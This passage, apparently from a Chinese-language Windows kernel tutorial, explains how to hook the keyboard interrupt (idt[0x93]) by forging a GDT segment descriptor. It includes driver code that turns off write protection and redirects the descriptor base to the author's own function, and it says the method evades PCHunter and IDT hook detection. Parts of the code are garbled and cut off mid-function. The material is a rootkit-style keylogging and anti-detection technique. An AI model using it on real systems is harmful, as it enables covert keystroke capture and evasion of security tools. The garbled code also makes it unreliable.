        unsigned short selector;
        unsigned char retention : 5;
        unsigned char zero1 : 3;
        unsigned char gate_type : 1;
        unsigned char zero2 : 1;
        unsigned char interrupt_gate_size : 1;
        unsigned char zero3 : 1;
        unsigned char zero4 : 1;
        unsigned char DPL : 2;
        unsigned char P : 1;
        unsigned short HiOffset;
    } IDTENTRY, *PIDTENTRY;
**如何用汇编获取IDTR呢？汇编指令sidt**  
##### IDT HOOK（过PCHunter）：
本文不用修改IDT中断处理表中的例程函数来做键盘HOOK，而介绍另一种IDT
HOOK的方式，我们上述提到了GDT/LDT，这两个叫做全局描述符表/局部描述符表，GDT表中每项都是一个段描述符，因为索引号只有13bit，所以GDT数组最多有8192个元素，用来权限检测等，寄存器显示的是段选择子，16bit可显，以前51cto写过相关的资料，安全相关的文章被屏蔽了......，以后有机会在重写一下这块文章。  
如何运作的呢，如下图所示，通过段选择子Segment Selector的TI标志位，如果是0意味着是GDT，如果是1意味着LDT表，GDTR
Registe读取表基地址：  
因为段描述符又分为系统段、代码段、数据段，根据标志位，下述贴出一个标准IA-32e下的Descriptor:  
有了上述知识的铺垫，来说一说键盘IDT HOOK如何实现，先明确思路，对于IDT
HOOK来说，中断描述符修改符号表中索引地址就可以了，因为端口与处理中断是一一对应。而针对GDT来说我们不可以直接修改段描述符中的基地址，也就是Base
Address直接修改，因为GDT会被其它的操作调用，贸然更改则会蓝屏崩溃。  
产生中断或异常后：
    1. CPU中断号找到 IDT 表中的中断描述符                -- 这一步存可以HOOK
    2. 获取门描述符中的段选择子.                         -- 这一步也可以HOOK
    3. 段选择子找到 GDT 表中的段描述符，然后在取出段基地址 -- 这一步可以HOOK
    4. 段基地址 + 门描述符中的函数偏移拿到函数地址.
    5. 调用函数
    kd> r gdtr
    gdtr=80b95000
    kd> dq gdtr
    80b95000  00000000`00000000 00cf9b00`0000ffff
    80b95010  00cf9300`0000ffff 00cffb00`0000ffff
    80b95020  00cff300`0000ffff 80008b1e`500020ab
    80b95030  84409316`6c003748 0040f300`00000fff
    80b95040  0000f200`0400ffff 00000000`00000000
    80b95050  84008916`40000068 84008916`40680068
    80b95060  00000000`00000000 00000000`00000000
    80b95070  800092b9`500003ff 00000000`00000000
    .............................................
（1）首先我们还是要获取idt[0x93]，也就是键盘中断处理例程函数地址，如下所示，IDTR的寄存器48bit，其中32bit是基址，后16bit是IDT长度，我们定义下述结构体：
    typedef struct _IDTR {
        USHORT   IDT_limit;
        USHORT   IDT_LOWbase;
        USHORT   IDT_HIGbase;
    }IDTR, *PIDTR;
    ULONG GetkeyIdtAddress()
    {
        IDTR        idtr;
        IDTENTRY    *pIdtr;
        __asm    SIDT    idtr;
        /*
            MAKELONG
            idtr.IDT_LOWbase;  // 与操作    IDT_LOWbase | IDT_HIGbase IDT_LOWbase, TempgdtrBaseaddress->IDT_HIGbase);
        // 500003ff`807f2abc
        DbgBreakPoint();
        // 1. 关闭写保护
        MemoryPageProtectOff();
        // 找到GDT[21]其实任意空 8个Bit 0都可以
        ULONG gdtrBase21 = (gdtrBase + sizeof(KGDTENTRY) * 0x15);
        DbgBreakPoint();
        // 将GDT[1]拷贝到GDT[21],创建新得段描述符
        RtlCopyMemory((PVOID)gdtrBase21, (PVOID)(gdtrBase + sizeof(KGDTENTRY)), sizeof(KGDTENTRY));
        DbgBreakPoint();
        // 将新创建段描述符的BaseAddress修改成我们自己的函数地址
        sgdtrDataArr = (PKGDTENTRY)gdtrBase21;
        sgdtrDataArr->HighWord.Bytes.BaseMid = (UCHAR)(((unsigned int)AddrNew >> 16) & 0xff);
        sgdtrDataArr->HighWord.Bytes.BaseHi = (UCHAR)((unsigned int)AddrNew >> 24);
        sgdtrDataArr->BaseLow = (USHORT)((unsigned int)AddrNew & 0x0000FFFF);
        DbgBreakPoint();
        MemoryPageProtectOn();
    }
虽然能过键盘钩子及IDT检测，但是没有过GDT检测，其实过GDT也很简单，当然不是本篇幅讨论的内容：  
上述中构建新GDT描述符位置索引0xA8或者0x4B（第九项）都可以，保证0~3Bit为0，涉及指令的权限检测，有兴趣的可以查一下Inter手册。其实中断门、调用门、任务门曾常常用于提权，切换选择子R3获取R0的权限。本身还想加一个HOOK检测逆向模块，但是就完全脱离了内容，所以后续有机会在分享讨论。